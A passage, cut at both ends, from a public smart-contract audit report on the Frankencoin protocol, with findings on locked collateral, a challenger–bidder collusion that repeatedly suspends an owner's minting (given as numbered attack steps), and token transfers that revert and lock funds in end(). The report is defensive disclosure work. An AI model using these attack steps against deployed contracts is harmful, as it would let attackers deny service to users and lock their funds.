id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Return the collateral to the owner at the end of <code>deny</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function deny(address[] calldata helpers, string calldata message) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (block.timestamp &gt;= start) revert TooLate();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IReserve(zchf.reserve()).checkQualified(msg.sender, helpers);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        cooldown = expiration; // since expiration is immutable, we put it under cooldown until the end</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        internalWithdrawCollateral(owner, IERC20(collateral).balanceOf(address(this)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit PositionDenied(msg.sender, message);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/874#issuecomment-1517665751\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p>Might be a design choice, will leave open for sponsor to comment.<br>\nSeverity should be medium since funds aren’t lost but are locked for some period of time.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/874#issuecomment-1528899606\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Excellent point! This is not intended and will be addressed. The owner of a denied position should be allowed to withdraw their collateral. Severity high is ok due to the high likelihood of this happening to innocent users, even though it is not a real loss of assets.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/874#issuecomment-1551898324\">hansfriese (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-06-challengers-and-bidders-can-collude-together-to-restrict-the-minting-of-position-owner\" style=\"position:relative;\"><a href=\"#m-06-challengers-and-bidders-can-collude-together-to-restrict-the-minting-of-position-owner\" aria-label=\"m 06 challengers and bidders can collude together to restrict the minting of position owner permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/745\">[M-06] Challengers and bidders can collude together to restrict the minting of position owner</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/745\">peanuts</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/806\">Kumpa</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/770\">m9800</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/735\">deliriusz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/674\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/452\">ltyu</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/441\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/425\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/385\">GreedyGoblin</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/369\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/207\">LegendFenGuin</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/124\">J4de</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/84\">deadrxsezzz</a></em></p>\n<p>There is no restrictions as to how many challenges can occur at one given auction time. A challenger can potentially create an insanely large amount of challenges with a tiny amount of collateral for each challenge.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function launchChallenge(address _positionAddr, uint256 _collateralAmount) external validPos(_positionAddr) returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IPosition position = IPosition(_positionAddr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IERC20(position.collateral()).transferFrom(msg.sender, address(this), _collateralAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 pos = challenges.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        challenges.push(Challenge(msg.sender, position, _collateralAmount, block.timestamp + position.challengePeriod(), address(0x0), 0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        position.notifyChallengeStarted(_collateralAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        emit ChallengeStarted(msg.sender, address(position), _collateralAmount, pos);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return pos;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>Let’s say if the fair price of 1000 ZCHF is 1 WETH, and the position owner sets his position at the fair price. Rationally, there will be no challenges and bidders because the price is fair. However, the challenger can attack the position owner this way:</p>\n<ol>\n<li>Set a small amount of collateralAmount to challenge, ie 0.0001 WETH.</li>\n<li>The bidder comes and bid a price over 1000* ZCHF (Not the actual amount*. The actual amount is an equivalent amount scaled to the collateral, but for simplicity sake let’s just say 1000 ZCHF, ideally its like 1000 * 0.0001 worth)</li>\n<li>Because the bid is higher than 1000* ZCHF, tryAvertChallenge() succeeds and the bidder buys the collateral from the challenger.</li>\n<li>When tryAvertChallenge() succeeds, restrictMinting(1 days) is called to suspend the owner from minting for 1 additional day</li>\n<li>If the challenger and the bidder is colluding or even the same person, then the bidder does not lose out because he is essentially buying the collateral for a higher price from himself.</li>\n<li>The challenger and bidder can repeat this attack and suspend the owner from minting. Such attack is possible because there is nothing much to lose other than a small amount of gas fees</li>\n</ol>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function tryAvertChallenge(uint256 _collateralAmount, uint256 _bidAmountZCHF) external onlyHub returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (block.timestamp &gt;= expiration){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return false; // position expired, let every challenge succeed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else if (_bidAmountZCHF * ONE_DEC18 &gt;= price * _collateralAmount){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // challenge averted, bid is high enough</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            challengedAmount -= _collateralAmount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Don&#39;t allow minter to close the position immediately so challenge can be repeated before</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // the owner has a chance to mint more on an undercollateralized position</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">//@audit-- calls restrictMinting if passed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            restrictMinting(1 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return false;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function restrictMinting(uint256 period) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 horizon = block.timestamp + period;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (horizon &gt; cooldown){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            cooldown = horizon;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Minting for Position owner will be suspended for a long time.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In this Frankencoin protocol, the challenger never really loses.</p>\n<p>If the bid ends lower than the liquidation price, then the bidder wins because he bought the collateral at a lower market value. The challenger also wins because he gets his reward. The protocol owner loses because he sold his collateral at a lower market value.</p>\n<p>If the bid ends higher than the liquidation price, then the bidder loses because he bought the collateral at a higher market value. The challenger wins because he gets to trade his collateral for a higher market value. The protocol owner neither wins nor loses.</p>\n<p>The particular POC above is one way a challenger can abuse his power to create many challenges without any sort of consequence in order to attack the owner. In the spirit of fairness, the challenger should also lose if he challenges wrongly.</p>\n<p>Every time a challenger issues a challenge, he should pay a small fix sum of money that will go to the owner if the bidder sets an amount higher than fair market value. (because that means that the protocol owner was right about the fair market value all along.)</p>\n<p>Although the position owner can be a bidder himself, if the position owner bids on his own position in order to win this small amount of money, the position owner will lose at the same time because he is buying the collateral at a higher-than-market price from the challenger, so this simultaneous gain and loss will balance out.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/745#issuecomment-1527735821\">0xA5DF (lookout) commented</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/385\"><code>#385</code></a> highlights that even without the added cooldown - there’s no price exacted from the challenger in case they fail.<br>\nThis can lead to false challenges that DoS legitimate positions, hoping to win some of the challenges by chance.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/745#issuecomment-1528909605\">luziusmeisser (Frankencoin) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Note that challenges must have a minimum size, so launching a large number of challenges locks up a significant amount of funds.</p>\n<p>However, it is true that a challenger and a bidder that collude could trigger a cooldown period.</p>\n<p>This is a valid issue. My mitigation is to not allow a challenge to be launched and averted in the same block. This ensures that the challenger has some money at risk as the challenger cannot be sure that it will be the bidder he is colluding with that can buy the collateral at a discount.</p>\n<p>Example:</p>\n<ol>\n<li>Alice has a position with WETH as collateral at liquidation price 500 ZCHF and a minimum collateral amount of 10 WETH.</li>\n<li>Bob launches a challenge with 10 WETH.</li>\n<li>Bob wants to bid on his own challenge in the next block, but gets frontrun by Charles, who buys the 10 WETH from Bob at a price of only 5000 ZCHF. Assuming 1 WETH is worth 2000 ZCHF, Bob suffers from a loss of 15000 ZCHF.</li>\n</ol>\n</blockquote>\n<hr>\n<h2 id=\"m-07-need-alternative-ways-for-fund-transfer-in-end-to-prevent-dos\" style=\"position:relative;\"><a href=\"#m-07-need-alternative-ways-for-fund-transfer-in-end-to-prevent-dos\" aria-label=\"m 07 need alternative ways for fund transfer in end to prevent dos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/680\">[M-07] Need alternative ways for fund transfer in <code>end()</code> to prevent DoS</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/680\">__141345__</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/974\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/854\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/711\">cccz</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/675\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/567\">said</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/459\">Emmanuel</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/444\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/443\">KIntern_NA</a>, <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/431\">ladboy233</a>, and <a href=\"https://github.com/code-423n4/2023-04-frankencoin-findings/issues/135\">SaeedAlipoor01988</a></em></p>\n<p>The <code>end()</code> function to conclude a challenge involves several fund transfer, including the return of challenger’s collateral, challenger’s reward transfer, the bidder’s excess return, position owner’s excess fund return. Further, in <code>Position.sol#notifyChallengeSucceeded()</code>, underlying collateral withdrawal. If anyone transfer of the above failed and revert, all the other transfer calls will fail. The fund could be stuck temporarily or forever.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The issue here is the external dependence of fund transfer. There could be several scenarios the individual transfer could fail. Such as erc20 0 amount transfer revert, position transfer ownership to <code>addr(0)</code>, zchf not enough balance, or other unexpected situations encountered, many other functionality will also be affected.</p>\n<p><strong>0 amount transfer</strong></p>\n<p>Concurrent challenges are allowed in the auction as per the comment in <code>Position.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">333: // Challenge is larger than the position. This can for example happen if there are multiple concurrent</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">334: // challenges that exceed the collateral balance in size. In this case, we need to redimension the bid and</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">335: // tell the caller that a part of the bid needs to be returned to the bidder.</span></span></code></pre>\n<p>So in one position, there could be many challenges at the same time, the <code>challengedAmount</code> can exceed the total collateral balance. As a result, the last challenger to call <code>MintingHub.sol#end()</code> will end up with 0 collateral transfer even if the challenge succeed. If the corresponding collateral erc20 revert on 0 amount transfer, the whole <code>end()</code> call will fail, further locking the collateral of the challenger.</p>\n<p>Since the total collateral balance is not enough to pay all the <code>challengeAmount</code>, eventually the collateral balance of the position will be drained, leaves nothing for those who have not call <code>end()</code> yet. When they call <code>end()</code>, the challenger’s collateral and bidder’s excess fund should be returned like below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MintingHub</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">end</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_challengeNumber</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">postponeCollateralReturn</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">returnCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">, </span><span class=\"mtk12\">postponeCollateralReturn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">260</span><span class=\"mtk1\">:         (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volume</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">repayment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reservePPM</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">position</span><span class=\"mtk1\">.</span><span class=\"mtk11\">notifyChallengeSucceeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">size</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">261</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">262</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// overbid, return excess amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">263</span><span class=\"mtk1\">:             </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">zchf</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">challenge</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bid</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">effectiveBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">264</span><span class=\"mtk1\">:         }</span></span></span></code></pre>\n<p>Then in <code>notifyChallengeSucceeded()</code>, the amount for collateral withdrawal will be 0.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notifyChallengeSucceeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyHub</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">330</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">challengedAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">331</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">collateralBalance</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">332</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_size</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">333</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// Challenge is larger than the position. This can for example happen if there are multiple concurrent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">334</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// challenges that exceed the collateral balance in size. In this case, we need to redimension the bid and</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">335</span><span class=\"mtk1\">:             </span><span class=\"mtk3\">// tell the caller that a part of the bid needs to be returned to the bidder.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">336</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_bid</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_divD18</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_mulD18</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bid</span><span class=\"mtk1\">, </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">337</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">_size</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">colBal</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">338</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">352</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">internalWithdrawCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_bidder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_size</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// transfer collateral to the bidder and emit update</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">internalWithdrawCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">269</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>However some erc20 will revert on 0 amount transfer. Such as (e.g., LEND -> see <a href=\"https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\">https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers</a>), it reverts for transfer with amount 0. Hence the whole <code>end()</code> call will fail, leading to lock of challenger’s collateral and bidder’s fund. Because the <code>returnCollateral()</code> and bid fund return are inside function <code>end()</code>, the revert of <code>notifyChallengeSucceeded()</code> could prevent the return of both.</p>\n<p>Although some collaterals used now may not revert on 0 amount transfer, many erc20 are upgradable, it is unknown if they will change the implementation in the future upgrades.</p>\n<p><strong>Position owner being <code>addr(0)</code></strong></p>\n<p>If a position owner transferring the ownership to <code>addr(0)</code>, and the challenge involves return excess fund to the owner, in line 268 of 